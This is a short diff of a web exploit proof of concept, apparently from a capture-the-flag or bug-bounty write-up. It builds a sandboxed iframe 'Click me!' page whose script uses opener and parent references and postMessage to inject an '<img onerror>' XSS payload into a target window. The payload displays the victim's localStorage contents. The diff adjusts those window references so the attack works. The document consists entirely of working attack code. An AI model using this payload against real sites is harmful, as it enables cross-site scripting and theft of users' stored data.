@@ -2,8 +2,8 @@
   <script>
     f = document.createElement('iframe');
     f.sandbox = 'allow-scripts allow-popups allow-top-navigation';
-    const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
-      x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
+    const payload = `x=parent.opener.top;parent.opener.postMessage(1,'*');setTimeout(()=>{
+      x.postMessage({type:'render',identifier:parent.identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
     },1000);`.replaceAll('\n',' ');
     f.srcdoc = `
     <h1>Click me!</h1>
